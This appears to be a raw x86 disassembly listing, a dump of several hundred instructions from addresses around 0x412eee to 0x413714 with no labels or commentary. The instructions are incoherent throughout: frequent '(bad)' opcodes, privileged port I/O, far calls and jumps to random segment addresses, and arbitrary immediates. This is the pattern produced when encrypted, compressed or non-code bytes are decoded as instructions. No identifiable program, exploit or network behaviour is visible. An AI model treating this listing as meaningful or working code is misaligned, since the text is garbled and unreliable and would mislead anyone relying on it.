  412eee:	fsub   DWORD PTR [ebx+eax*1+0x37053928]
  412ef5:	mov    edi,DWORD PTR [edi]
  412ef7:	arpl   WORD PTR [ecx+eiz*4],ax
  412efa:	or     BYTE PTR [edx],bl
  412efc:	xchg   edi,eax
  412efd:	in     al,dx
  412efe:	(bad)  [eax+0x45e96969]
  412f04:	push   esi
  412f05:	das    
  412f06:	out    dx,eax
  412f07:	fcomip st,st(6)
  412f09:	retf   
  412f0a:	jp     0x412f12
  412f0c:	sub    BYTE PTR [ebp+0x2ac96454],ah
  412f12:	stc    
  412f13:	shld   ebx,edi,0xa0
  412f17:	jl     0x412f1b
  412f19:	fdiv   DWORD PTR [eax]
  412f1b:	dec    esp
  412f1c:	adc    DWORD PTR [ecx],0x9b6c0626
  412f22:	mov    ds:0xc956ff0b,eax
  412f27:	xlat   BYTE PTR ds:[ebx]
  412f28:	mov    edx,0xb7d91397
  412f2d:	add    edx,ebx
  412f2f:	ins    BYTE PTR es:[edi],dx
  412f30:	(bad)
  412f34:	dec    ecx
  412f35:	pop    eax
  412f36:	adc    bh,ah
  412f38:	cmp    eax,DWORD PTR [ecx+ebp*2]
  412f3b:	pop    edx
  412f3c:	pop    edx
  412f3d:	jmp    0x412f8f
  412f3f:	jmp    0x32a9b3a5
  412f44:	and    eax,0xd0165580
  412f49:	rcr    DWORD PTR [edx-0x46],cl
  412f4c:	inc    esp
  412f4d:	or     BYTE PTR [ecx+0x2d6f0b6a],0xdd
  412f54:	in     eax,dx
  412f55:	jae    0x412f37
  412f57:	jnp    0x412ef0
  412f59:	sbb    esp,eax
  412f5b:	push   ecx
  412f5c:	cli    
  412f5d:	adc    esi,DWORD PTR [ebp+0x23]
  412f60:	pop    eax
  412f61:	and    ch,bh
  412f63:	and    dh,0x9b
  412f66:	jae    0x412f8d
  412f68:	sahf   
  412f69:	push   0x41
  412f6b:	lods   al,BYTE PTR ds:[esi]
  412f6c:	and    al,0x2c
  412f6e:	in     eax,0x30
  412f70:	add    ah,bh
  412f72:	(bad)  
  412f73:	into   
  412f74:	cmp    al,0xf2
  412f76:	xor    ecx,DWORD PTR [esi+0x68]
  412f79:	xchg   ebp,eax
  412f7a:	outs   dx,BYTE PTR ds:[esi]
  412f7b:	sahf   
  412f7c:	jl     0x412f9d
  412f7e:	mov    dl,BYTE PTR [edx+ecx*4+0x5]
  412f82:	shl    ebp,1
  412f84:	aas    
  412f85:	mov    eax,0x587ee469
  412f8a:	cmc    
  412f8b:	mov    edx,0x73f64a27
  412f90:	sub    eax,0x2e6c99d5
  412f95:	push   ss
  412f96:	pop    esi
  412f97:	mov    edx,0x961624ba
  412f9c:	cli    
  412f9d:	test   eax,0xa185a07b
  412fa2:	add    DWORD PTR [ebx-0x1542e333],esp
  412fa8:	xchg   DWORD PTR [edi-0x6],eax
  412fab:	cmp    al,0xb6
  412fad:	loop   0x412f4f
  412faf:	xchg   ecx,eax
  412fb0:	mov    dh,0xd2
  412fb2:	std    
  412fb3:	inc    edx
  412fb4:	and    eax,0x33903e09
  412fb9:	and    esi,edx
  412fbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412fbd:	into   
  412fbe:	add    al,0x4a
  412fc0:	mov    ebp,0x8661850d
  412fc5:	cmp    BYTE PTR [ebp+0x3],bh
  412fc8:	push   ss
  412fc9:	pop    edi
  412fca:	and    eax,0x9f2016b7
  412fcf:	sbb    al,al
  412fd1:	sbb    DWORD PTR [eax],esp
  412fd3:	add    DWORD PTR [ebx+esi*1+0x49c93ce0],ecx
  412fda:	aad    0x54
  412fdc:	and    BYTE PTR [edi+0x11],cl
  412fdf:	ret    
  412fe0:	xor    DWORD PTR [ebp+eiz*4+0x434abdba],0x71
  412fe8:	jl     0x41303a
  412fea:	sub    bl,dh
  412fec:	mov    ah,0xdf
  412fee:	std    
  412fef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ff0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ff1:	mov    al,ds:0xa0c44b5b
  412ff6:	mov    edi,0xacfd7857
  412ffb:	aad    0x20
  412ffd:	push   0xd61f0c3b
  413002:	jnp    0x412fe2
  413004:	xor    bh,ah
  413006:	(bad)  
  413007:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413008:	into   
  413009:	sbb    al,0x0
  41300b:	xchg   ecx,eax
  41300c:	rcl    BYTE PTR [ebx+0x52ad0582],1
  413012:	push   ss
  413013:	ss out 0xf4,eax
  413016:	and    al,0xe4
  413018:	mov    eax,0x793f96fb
  41301d:	mov    ebx,0x8e958bba
  413022:	inc    ebx
  413023:	fcomp  DWORD PTR [ebx-0x66]
  413026:	cmp    al,0xd
  413028:	mov    ds:0x327bc858,al
  41302d:	sbb    DWORD PTR [ebx+0x65],ebx
  413030:	jo     0x413058
  413032:	sti    
  413033:	mov    dh,0x6c
  413035:	jne    0x413073
  413037:	ret    
  413038:	pusha  
  413039:	and    ecx,ebx
  41303b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41303c:	mov    ebp,0xd661e35c
  413041:	les    ebx,FWORD PTR [edx]
  413043:	xor    al,0xa1
  413045:	push   ss
  413046:	jo     0x4130ac
  413048:	xchg   BYTE PTR [ecx+edi*4+0x1b],bh
  41304c:	mov    dl,0x3a
  41304e:	push   0x44
  413050:	inc    ecx
  413051:	retf   
  413052:	lock sahf 
  413054:	loopne 0x413054
  413056:	xchg   edi,eax
  413057:	aad    0xfc
  413059:	push   0x2d
  41305b:	in     al,0xf2
  41305d:	mov    dh,0xb4
  41305f:	add    edx,ebx
  413061:	adc    DWORD PTR ds:0x3c006b68,ecx
  413067:	test   BYTE PTR [ebx+ebx*1],0x6
  41306b:	(bad)  [edi]
  41306d:	push   0x3c
  41306f:	cmp    al,BYTE PTR [edx-0x25]
  413072:	inc    ebp
  413073:	das    
  413074:	dec    esp
  413075:	mov    esi,0x4d12e152
  41307a:	and    eax,0xdddc3025
  41307f:	push   ss
  413080:	add    eax,0x5ebf4796
  413085:	sub    edx,edi
  413087:	fcomp  QWORD PTR [ecx+0x6d]
  41308a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41308b:	xor    BYTE PTR [edx],dh
  41308d:	or     al,0xf7
  41308f:	mov    edx,0x65fea5d4
  413094:	dec    esp
  413095:	retf   0x9746
  413098:	add    eax,0xeb8081e9
  41309d:	push   ds
  41309e:	imul   eax,DWORD PTR [ebp+0x1364f11c],0xb1887f7
  4130a8:	push   ebp
  4130a9:	call   0x5690:0xa0554eb9
  4130b0:	xchg   BYTE PTR [ebx+0x26],bl
  4130b3:	jecxz  0x41306a
  4130b5:	cmp    DWORD PTR [ebp+0x24],esi
  4130b8:	push   ss
  4130b9:	xchg   ebx,eax
  4130ba:	jmp    0xccb0:0xd7144f14
  4130c1:	test   bl,bl
  4130c3:	jl     0x4130cd
  4130c5:	in     eax,0x19
  4130c7:	sub    BYTE PTR [esi+0x5f],cl
  4130ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4130cb:	mov    DWORD PTR [ecx-0x1d],ecx
  4130ce:	add    al,0xbe
  4130d0:	shl    ecx,0xf6
  4130d3:	mov    edi,fs
  4130d5:	add    ch,BYTE PTR [esi+0x41d40fda]
  4130db:	mov    ds:0x5c2de439,al
  4130e0:	sub    BYTE PTR [bp+si],bh
  4130e3:	fwait
  4130e4:	push   ecx
  4130e5:	push   ss
  4130e6:	sub    al,0x65
  4130e8:	sub    BYTE PTR [edx],ch
  4130ea:	loope  0x413156
  4130ec:	dec    ebx
  4130ed:	sbb    DWORD PTR [edx-0x13],esi
  4130f0:	dec    eax
  4130f1:	add    al,0x85
  4130f3:	adc    BYTE PTR [ebx+0x64822289],ch
  4130f9:	xchg   ecx,eax
  4130fa:	stc    
  4130fb:	xor    BYTE PTR [esi],0x9
  4130fe:	pop    edi
  4130ff:	lea    esi,[eax*4-0x52f66694]
  413106:	add    BYTE PTR [bp+0x25],0x85
  41310b:	xchg   ebp,eax
  41310c:	sbb    edi,DWORD PTR [esi+eiz*2]
  41310f:	out    0x77,eax
  413111:	xchg   edi,eax
  413112:	cmp    BYTE PTR [ecx-0x53],dl
  413115:	sar    DWORD PTR [eax+0x40300e8e],cl
  41311b:	popa   
  41311c:	pop    esi
  41311d:	push   edi
  41311e:	pop    esi
  41311f:	je     0x413100
  413121:	dec    edi
  413122:	cmp    bh,BYTE PTR [edi-0x75e0f100]
  413128:	clc    
  413129:	stos   DWORD PTR es:[edi],eax
  41312a:	(bad)  
  41312b:	(bad)  
  41312d:	mov    ecx,0xa6716f8
  413132:	xor    ecx,DWORD PTR [edi-0xde65298]
  413138:	push   ecx
  413139:	add    edx,DWORD PTR [edx]
  41313b:	ret    0xdfb8
  41313e:	nop
  41313f:	aad    0xc4
  413141:	dec    edx
  413142:	outs   dx,BYTE PTR ds:[esi]
  413143:	iret   
  413144:	scas   eax,DWORD PTR es:[edi]
  413145:	ins    DWORD PTR es:[edi],dx
  413146:	adc    cl,BYTE PTR [ecx]
  413148:	mov    ch,0x1b
  41314a:	mov    bh,0xc4
  41314c:	fs push eax
  41314e:	call   0x56c65080
  413153:	pop    ss
  413154:	scas   eax,DWORD PTR es:[edi]
  413155:	cmp    BYTE PTR [edx+0x7d],cl
  413158:	fldpi  
  41315a:	cs pop ss
  41315c:	mul    ch
  41315e:	ret    0xd0b7
  413161:	mov    ebx,0x89307bfa
  413166:	mov    ah,0xdc
  413168:	sbb    DWORD PTR [edi],0x68c66499
  41316e:	cmp    al,0xa5
  413170:	outs   dx,DWORD PTR ds:[esi]
  413171:	loope  0x4131d0
  413173:	retf   
  413174:	xchg   esp,eax
  413175:	jns    0x4131de
  413177:	sbb    DWORD PTR [edi-0x26c49880],edi
  41317d:	test   al,0xdf
  41317f:	loopne 0x4131b9
  413181:	jp     0x413141
  413183:	dec    edi
  413184:	and    al,0x2d
  413186:	dec    ecx
  413187:	idiv   BYTE PTR [ebp+esi*8+0x733d6253]
  41318e:	sbb    eax,0x9ab74973
  413193:	pop    esp
  413194:	icebp  
  413195:	and    dl,BYTE PTR ds:0xcf9681c8
  41319b:	push   ebp
  41319c:	popa   
  41319d:	fiadd  WORD PTR [eax+0x5d]
  4131a0:	out    dx,al
  4131a1:	ja     0x4131bd
  4131a3:	sahf   
  4131a4:	adc    al,0xbb
  4131a6:	cld    
  4131a7:	mov    edi,0xa61e4163
  4131ac:	add    ebp,DWORD PTR [esi]
  4131ae:	cld    
  4131af:	popa   
  4131b0:	pop    ds
  4131b1:	mov    DWORD PTR [ecx-0x19],esp
  4131b4:	les    esi,FWORD PTR [ecx+0x39]
  4131b7:	addr16 dec edi
  4131b9:	enter  0xeb5f,0xc2
  4131bd:	mov    ah,0xc6
  4131bf:	inc    ebx
  4131c0:	mov    dl,0x7b
  4131c2:	xor    BYTE PTR [edx-0x7363163b],bl
  4131c8:	xor    al,0x70
  4131ca:	jnp    0x4131b9
  4131cc:	jmp    0x4131f3
  4131ce:	xlat   BYTE PTR ds:[ebx]
  4131cf:	xchg   esi,eax
  4131d0:	sub    ebx,edx
  4131d2:	inc    ebx
  4131d3:	in     eax,dx
  4131d4:	bound  ebx,QWORD PTR [eax+0x641e2200]
  4131da:	stos   DWORD PTR es:[edi],eax
  4131db:	mov    ds:0x8976bb64,al
  4131e0:	dec    ebx
  4131e1:	test   al,0xe2
  4131e3:	sar    BYTE PTR [ebx+0x46575fb1],cl
  4131e9:	pop    ebp
  4131ea:	and    ah,dh
  4131ec:	cmp    DWORD PTR [ebp+0x7e],0x63
  4131f0:	outs   dx,BYTE PTR ds:[esi]
  4131f1:	cmp    esi,DWORD PTR [esp+edx*1+0x3680ee8e]
  4131f8:	fld    DWORD PTR [ebx]
  4131fa:	int    0xc2
  4131fc:	sahf   
  4131fd:	fsubp  st(7),st
  4131ff:	lods   eax,DWORD PTR ds:[esi]
  413200:	mov    ?,ebp
  413202:	sti    
  413203:	mov    al,ds:0xd0640914
  413208:	dec    DWORD PTR [edi+edi*4-0x71]
  41320c:	xor    al,0xb0
  41320e:	loopne 0x4131b9
  413210:	out    0xa0,eax
  413212:	int    0x37
  413214:	imul   esi,DWORD PTR [ebx+esi*2-0x61],0x66cfd435
  41321c:	dec    ebx
  41321d:	pop    ss
  41321e:	cmp    bl,BYTE PTR [edi+ebx*8+0x6b3f4040]
  413225:	cmc    
  413226:	(bad)  
  413227:	hlt    
  413228:	mov    dh,0xe8
  41322a:	push   ebx
  41322b:	sbb    eax,0x9d04806c
  413230:	shl    dl,0x18
  413233:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413234:	adc    BYTE PTR [ebx+0x375eb661],0xea
  41323b:	scas   al,BYTE PTR es:[edi]
  41323c:	and    BYTE PTR [edi],0xe8
  41323f:	xchg   edx,eax
  413240:	inc    ebp
  413241:	adc    cl,BYTE PTR [esp+esi*1-0x72]
  413245:	gs (bad) 
  413247:	retf   
  413248:	mov    al,0xc4
  41324a:	sub    al,0xfa
  41324c:	out    0xc5,eax
  41324e:	push   eax
  41324f:	sbb    al,BYTE PTR [edx+esi*2]
  413252:	lahf   
  413253:	loopne 0x41328f
  413255:	in     eax,0xf1
  413257:	sub    cl,0xaa
  41325a:	lahf   
  41325b:	pop    edx
  41325c:	push   edx
  41325d:	adc    eax,0xa3ac7137
  413262:	jecxz  0x41322a
  413264:	adc    esi,DWORD PTR [edx+0x73afbdea]
  41326a:	add    BYTE PTR [edi-0x61a9495b],bh
  413270:	add    ch,cl
  413272:	add    BYTE PTR [edx+0x769a9400],bh
  413278:	ret    
  413279:	(bad)  
  41327a:	(bad)  
  41327c:	jns    0x413297
  41327e:	inc    eax
  41327f:	sub    edx,DWORD PTR [esi-0x9]
  413282:	dec    edx
  413283:	mov    esi,0xc467af4a
  413288:	mov    DWORD PTR [esi-0x64676504],edi
  41328e:	pop    ecx
  41328f:	mov    al,ch
  413291:	jecxz  0x41324a
  413293:	call   0x346a986d
  413298:	xchg   DWORD PTR [edx],ebp
  41329a:	mov    ecx,0x4d041cf3
  41329f:	or     cl,dh
  4132a1:	mov    eax,0x85dd198a
  4132a6:	ja     0x4132d3
  4132a8:	(bad)  
  4132a9:	int3   
  4132aa:	inc    edi
  4132ab:	adc    DWORD PTR [esi-0x1168430d],0xfffffff6
  4132b2:	aam    0xfa
  4132b4:	sbb    BYTE PTR [edi+0x704dc3cb],al
  4132ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4132bb:	adc    cl,BYTE PTR [ebx-0x368dd7a1]
  4132c1:	and    BYTE PTR [ebx],ch
  4132c3:	inc    ecx
  4132c4:	ins    DWORD PTR es:[edi],dx
  4132c5:	repnz pop ebp
  4132c7:	dec    ebx
  4132c8:	sar    BYTE PTR [ebp+0xb],cl
  4132cb:	sbb    eax,0x70e8fe02
  4132d0:	xchg   ebx,eax
  4132d1:	je     0x413347
  4132d3:	inc    esi
  4132d4:	call   0xd684:0x9382c9c1
  4132db:	push   ds
  4132dc:	fbld   TBYTE PTR [esi]
  4132de:	ror    esp,0x25
  4132e1:	in     eax,0xa7
  4132e3:	loop   0x41328a
  4132e5:	xor    DWORD PTR [ecx-0x3ccb99e1],esp
  4132eb:	push   es
  4132ec:	test   ebp,edi
  4132ee:	and    DWORD PTR [ebx-0x76],eax
  4132f1:	int    0xc2
  4132f3:	dec    esp
  4132f4:	dec    ecx
  4132f5:	clc    
  4132f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4132f7:	add    eax,0x459bf6bc
  4132fc:	xor    eax,DWORD PTR cs:[esp+eax*2+0x6d208543]
  413304:	xchg   ebp,eax
  413305:	adc    al,0xd1
  413307:	xchg   ebp,eax
  413308:	arpl   si,si
  41330a:	or     al,0xcc
  41330c:	pop    es
  41330d:	pusha  
  41330e:	xchg   ebx,eax
  41330f:	loopne 0x413372
  413311:	js     0x413365
  413313:	cwde   
  413314:	repnz xor cl,0xc0
  413318:	xor    ebx,esi
  41331a:	xlat   BYTE PTR ds:[ebx]
  41331b:	popa   
  41331c:	in     eax,dx
  41331d:	jne    0x413311
  41331f:	add    ebx,DWORD PTR [ebx-0x34]
  413322:	push   DWORD PTR [edx-0x32]
  413325:	shl    DWORD PTR [esi-0x39],cl
  413328:	daa    
  413329:	jle    0x4132c5
  41332b:	es pop ds
  41332d:	in     al,0x6b
  41332f:	dec    ecx
  413330:	addr16 jge 0x4132da
  413333:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413334:	pop    es
  413335:	imul   DWORD PTR [eax-0x22]
  413338:	rcl    DWORD PTR [ecx],0xdd
  41333b:	popf   
  41333c:	aam    0x87
  41333e:	icebp  
  41333f:	xchg   ebp,eax
  413340:	popa   
  413341:	xchg   edi,eax
  413342:	mov    ch,0xa2
  413344:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413345:	xor    BYTE PTR [edx],bl
  413347:	and    eax,0xa30dae04
  41334c:	lahf   
  41334d:	pop    ss
  41334e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41334f:	push   ebp
  413350:	mov    gs,WORD PTR [edi-0x3a59f367]
  413356:	enter  0x69f8,0x5
  41335a:	push   esp
  41335b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41335c:	loop   0x413332
  41335e:	mov    ebp,0xcdb47f8f
  413363:	not    BYTE PTR [esi-0x50d2f90a]
  413369:	dec    ebx
  41336a:	inc    eax
  41336b:	add    bl,BYTE PTR [edi+0x2736dee7]
  413371:	push   edi
  413372:	ret    0x4e02
  413375:	push   es
  413376:	cmp    al,0x60
  413378:	pop    es
  413379:	outs   dx,DWORD PTR ss:[esi]
  41337b:	mov    cl,0x8c
  41337d:	fsubr  QWORD PTR [edx]
  41337f:	mov    edx,0xc0ad3fa0
  413384:	test   al,0x4d
  413386:	mov    edi,0x9df41206
  41338b:	dec    ebp
  41338c:	sbb    ebp,ebp
  41338e:	enter  0x6255,0x3e
  413392:	loope  0x4133a4
  413394:	inc    eax
  413395:	cmc    
  413396:	es mov ebp,0x4ec3c76
  41339c:	push   ss
  41339d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41339e:	rcr    DWORD PTR [ebx+0x29],cl
  4133a1:	stos   DWORD PTR es:[edi],eax
  4133a2:	test   al,0x7e
  4133a4:	outs   dx,BYTE PTR ds:[esi]
  4133a5:	xor    al,dh
  4133a7:	shl    DWORD PTR [edi+0x1e],0xfd
  4133ab:	dec    ecx
  4133ac:	mov    ch,cl
  4133ae:	mov    edx,ss
  4133b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4133b1:	ds mov ecx,0x50c371ca
  4133b7:	mov    ebp,0xf1a934c7
  4133bc:	sar    BYTE PTR [esi],0xd3
  4133bf:	icebp  
  4133c0:	jne    0x413395
  4133c2:	jmp    0xa31:0xcb1438c5
  4133c9:	arpl   WORD PTR [esi-0x17],ax
  4133cc:	pop    edx
  4133cd:	inc    esi
  4133ce:	jge    0x413439
  4133d0:	mov    al,BYTE PTR [esi-0xc3dfff0]
  4133d6:	pop    ss
  4133d7:	mov    ecx,0x34d2d068
  4133dc:	ja     0x413432
  4133de:	not    DWORD PTR [edi-0x12eccd1a]
  4133e4:	mov    eax,0xd7f516a6
  4133e9:	repnz outs dx,BYTE PTR ds:[esi]
  4133eb:	icebp  
  4133ec:	(bad)  
  4133ed:	cmp    dh,bl
  4133ef:	in     eax,dx
  4133f0:	(bad)  
  4133f1:	cmc    
  4133f2:	jmp    0x7ea2:0xa2daeff
  4133f9:	adc    eax,0x498fa1af
  4133fe:	mov    dl,0x93
  413400:	icebp  
  413401:	retf   
  413402:	(bad)  
  413403:	xlat   BYTE PTR ds:[ebx]
  413404:	jb     0x413391
  413406:	das    
  413407:	adc    ebp,DWORD PTR [ebx-0x60]
  41340a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41340b:	jecxz  0x41343e
  41340d:	popa   
  41340e:	(bad)  
  41340f:	pop    edi
  413410:	popf   
  413411:	sbb    bh,BYTE PTR [eax]
  413413:	cmp    DWORD PTR [edx+0x73631f6f],edx
  413419:	sbb    al,0xe3
  41341b:	push   eax
  41341c:	fidiv  WORD PTR [edx+0x71]
  41341f:	sub    ebx,DWORD PTR [ecx]
  413421:	out    0x5,eax
  413423:	and    eax,0x17735eb5
  413428:	adc    DWORD PTR [ebx-0x1084d86e],esp
  41342e:	out    dx,al
  41342f:	xor    al,bl
  413431:	aad    0xfa
  413433:	push   esi
  413434:	inc    esp
  413435:	mov    al,0xe9
  413437:	dec    ecx
  413438:	mov    dh,0x3b
  41343a:	pop    ebx
  41343b:	mov    DWORD PTR [edx+0x247238bf],ebp
  413441:	lods   eax,DWORD PTR ds:[esi]
  413442:	push   esi
  413443:	adc    bh,BYTE PTR [ebp-0x1f8772a8]
  413449:	cdq    
  41344a:	stos   DWORD PTR es:[edi],eax
  41344b:	imul   edi,DWORD PTR [eax],0xffffffa2
  41344e:	xor    BYTE PTR cs:[eax-0x38658ce],0x44
  413456:	pushf  
  413457:	out    0x6b,eax
  413459:	in     eax,0xe8
  41345b:	in     eax,0xdf
  41345d:	aad    0xad
  41345f:	lock in al,0x5d
  413462:	cmp    al,BYTE PTR [ecx+0x3007d072]
  413468:	xchg   ecx,eax
  413469:	sbb    DWORD PTR [edx],0x4bff327e
  41346f:	aam    0xee
  413471:	adc    DWORD PTR [esi-0x4e],eax
  413474:	in     eax,0xf7
  413476:	lods   eax,DWORD PTR ds:[esi]
  413477:	addr16 js 0x41343a
  41347a:	jne    0x4134d7
  41347c:	imul   DWORD PTR ds:0x54b6e3a5
  413482:	mov    WORD PTR [eax-0x44],ds
  413485:	div    bl
  413487:	jmp    0x4134ee
  413489:	mov    ebp,0x72b5cdb3
  41348e:	enter  0xe38a,0xf9
  413492:	or     BYTE PTR [eax+0x69],0x0
	...
  413512:	add    BYTE PTR [eax],al
  413514:	call   0xbb94:0xbf94b5b1
  41351b:	mov    edi,0x1b5d8b00
  413520:	sar    ebp,0x1a
  413523:	(bad)  
  413524:	mov    cl,0xdc
  413526:	add    BYTE PTR [eax],al
  413528:	imul   eax,DWORD PTR [edi],0xc2670000
  41352e:	add    ebp,DWORD PTR [ebx]
  413530:	pop    ebp
  413531:	sub    bh,BYTE PTR [esi]
  413533:	outs   dx,DWORD PTR ds:[esi]
  413534:	cwde   
  413535:	push   eax
  413536:	imul   ebx,edi,0x55
  413539:	mov    bh,BYTE PTR [edx-0x3e5674ed]
  41353f:	aad    0x9a
  413541:	int    0x19
  413543:	and    DWORD PTR ds:0x9dc30803,0x36
  41354a:	add    DWORD PTR [ecx+0x79],esi
  41354d:	xsha1  (bad)
  41354e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41354f:	push   cs
  413550:	pop    ebx
  413551:	fmul   DWORD PTR [eax-0x1b]
  413554:	jno    0x413542
  413556:	rsqrtps xmm2,XMMWORD PTR [eax]
  413559:	dec    eax
  41355a:	and    BYTE PTR [eax],cl
  41355c:	mov    ds:0x1e3bcc0e,al
  413561:	push   es
  413562:	lea    esp,[ecx]
  413564:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413565:	test   cl,0x8f
  413568:	addr16 jmp 0x3f683836
  41356e:	cmp    esi,DWORD PTR [ecx+0x61003661]
  413574:	adc    edi,ebp
  413576:	jne    0x413510
  413578:	sub    esp,eax
  41357a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41357b:	cmc    
  41357c:	mov    al,ds:0x1710f9a8
  413581:	fadd   QWORD PTR [ebx]
  413583:	mov    al,ds:0x3d96b915
  413588:	sahf   
  413589:	loope  0x41356d
  41358b:	sbb    eax,0x9d9d76dd
  413590:	pop    es
  413591:	call   0x56b8e53
  413596:	dec    ecx
  413597:	xor    eax,0x2dff20ce
  41359c:	and    al,al
  41359e:	ret    
  41359f:	mov    eax,edx
  4135a1:	test   al,0xa3
  4135a3:	sub    BYTE PTR [esi-0x5e],ch
  4135a6:	or     DWORD PTR [edi-0x79],ecx
  4135a9:	iret   
  4135aa:	ficom  DWORD PTR [edi]
  4135ac:	mov    ?,ebx
  4135ae:	push   ebx
  4135af:	dec    ebx
  4135b0:	fcomip st,st(5)
  4135b2:	xchg   ecx,eax
  4135b3:	xchg   edx,eax
  4135b4:	mov    bl,0x45
  4135b6:	inc    ebx
  4135b7:	mov    ch,0x27
  4135b9:	or     dl,dh
  4135bb:	data16 out dx,al
  4135bd:	lods   al,BYTE PTR ds:[esi]
  4135be:	push   edx
  4135bf:	cmp    BYTE PTR [eax],cl
  4135c1:	mov    bl,0x5c
  4135c3:	rol    ebx,0x92
  4135c6:	and    dh,BYTE PTR [ebx+0x5e]
  4135c9:	mov    edi,0xcb2fa58e
  4135ce:	push   es
  4135cf:	sub    al,0xd9
  4135d1:	test   al,ah
  4135d3:	push   ds
  4135d4:	sbb    esp,DWORD PTR [edx+0x79a4b099]
  4135da:	fwait
  4135db:	and    eax,0xabe5c209
  4135e0:	lods   eax,DWORD PTR ds:[esi]
  4135e1:	mov    ds:0x6b47537f,al
  4135e6:	inc    eax
  4135e7:	mov    ds:0xd5de261,al
  4135ec:	out    dx,al
  4135ed:	or     DWORD PTR [edi+0x55774443],edx
  4135f3:	std    
  4135f4:	ss jmp 0x413618
  4135f7:	fdivr  QWORD PTR [ebx]
  4135f9:	ret    
  4135fa:	aam    0x2d
  4135fc:	pop    ecx
  4135fd:	mov    eax,DWORD PTR [eax-0x11]
  413600:	inc    ebx
  413601:	fs cwde 
  413603:	push   ss
  413604:	int    0x9c
  413606:	push   ebx
  413607:	fst    QWORD PTR [edi]
  413609:	mov    DWORD PTR [edi-0x3e],ebp
  41360c:	fsub   QWORD PTR [esi-0x3c]
  41360f:	jecxz  0x41365a
  413611:	in     eax,0x4a
  413613:	jnp    0x4135ee
  413615:	xlat   BYTE PTR ds:[ebx]
  413616:	xor    BYTE PTR [edi+0x11],dh
  413619:	sbb    al,0x25
  41361b:	js     0x4135d9
  41361d:	(bad)  
  41361e:	xor    BYTE PTR [edi-0x5b058819],bl
  413624:	adc    esi,eax
  413626:	push   es
  413627:	mov    ds:0xc8b142b8,al
  41362c:	and    ebx,DWORD PTR [ebx-0x37]
  41362f:	jno    0x413660
  413631:	into   
  413632:	add    DWORD PTR [edx],0x94fcdcd8
  413638:	out    0x28,eax
  41363a:	add    BYTE PTR [ecx],bh
  41363c:	data16 jno 0x4136b6
  41363f:	dec    edx
  413640:	repnz pop edi
  413642:	lods   eax,DWORD PTR ds:[esi]
  413643:	pop    esi
  413644:	dec    ebp
  413645:	shl    DWORD PTR [ecx+0x2c5d8a21],cl
  41364b:	idiv   DWORD PTR [ecx+edx*1]
  41364e:	int3   
  41364f:	js     0x4135fe
  413651:	sets   BYTE PTR [ebp+edi*1+0x18e6d743]
  413659:	(bad)  
  41365b:	sub    BYTE PTR [ecx+0x14],cl
  41365e:	popa   
  41365f:	and    eax,0xfa3c42a0
  413664:	aaa    
  413665:	xchg   ecx,eax
  413666:	rcl    DWORD PTR [eax+0x3121d2b6],1
  41366c:	cmp    dh,BYTE PTR [esi+0x48]
  41366f:	mov    dh,0x6e
  413671:	add    esi,DWORD PTR [esi]
  413673:	repz xchg edx,eax
  413675:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413676:	iret   
  413677:	rol    ah,cl
  413679:	out    dx,eax
  41367a:	mov    eax,DWORD PTR [ebx-0x165db04b]
  413680:	push   ecx
  413681:	jbe    0x4136db
  413683:	xchg   edx,eax
  413684:	adc    al,0x92
  413686:	popf   
  413687:	xor    al,0xd1
  413689:	test   al,0xf0
  41368b:	pop    ss
  41368c:	inc    ebp
  41368d:	sub    DWORD PTR [edi-0x57],ecx
  413690:	and    ch,BYTE PTR [ebx-0x60]
  413693:	xlat   BYTE PTR ds:[ebx]
  413694:	mov    ecx,0x7d13573b
  413699:	lahf   
  41369a:	aad    0x18
  41369c:	xchg   edx,ecx
  41369e:	test   eax,0xb44ab264
  4136a3:	aaa    
  4136a4:	mov    edx,0x6f232377
  4136a9:	xchg   ebx,eax
  4136aa:	cmc    
  4136ab:	aas    
  4136ac:	mov    edi,0xa10e723c
  4136b1:	ins    DWORD PTR es:[edi],dx
  4136b2:	int3   
  4136b3:	pop    esi
  4136b4:	sub    eax,0x6640a5a0
  4136b9:	jg     0x4136ff
  4136bb:	call   0x31:0xd8a0aaf0
  4136c2:	std    
  4136c3:	lods   eax,DWORD PTR ds:[esi]
  4136c4:	add    eax,0x3d7548c3
  4136c9:	sbb    edx,ebp
  4136cb:	gs mov edx,0x44bbce2f
  4136d1:	xchg   edx,eax
  4136d2:	inc    ebp
  4136d3:	adc    DWORD PTR [ecx],esp
  4136d5:	ja     0x4136b2
  4136d7:	call   0x2f1d:0xc107a9bd
  4136de:	test   BYTE PTR [edi-0x56931d6c],0x26
  4136e5:	outs   dx,BYTE PTR ds:[esi]
  4136e6:	jne    0x4136a3
  4136e8:	push   ebx
  4136e9:	int3   
  4136ea:	or     esp,DWORD PTR [ebx+0x3ec55053]
  4136f0:	add    BYTE PTR [esi-0x41],cl
  4136f3:	or     al,0x26
  4136f5:	ss or  eax,0xb5ca7498
  4136fb:	inc    edi
  4136fc:	or     ebx,DWORD PTR [ebx+0x79]
  4136ff:	fdiv   st(5),st
  413701:	adc    al,0xa7
  413703:	fwait
  413704:	push   0xfffffffc
  413706:	imul   edx,ebp,0xffffff8d
  413709:	sub    bl,0xa4
  41370c:	xor    edi,ecx
  41370e:	cld    
  41370f:	inc    esp
  413710:	pushf  
  413711:	bound  eax,QWORD PTR [eax+0x61]
  413714:	lods   al,BYTE PTR ds:[esi]
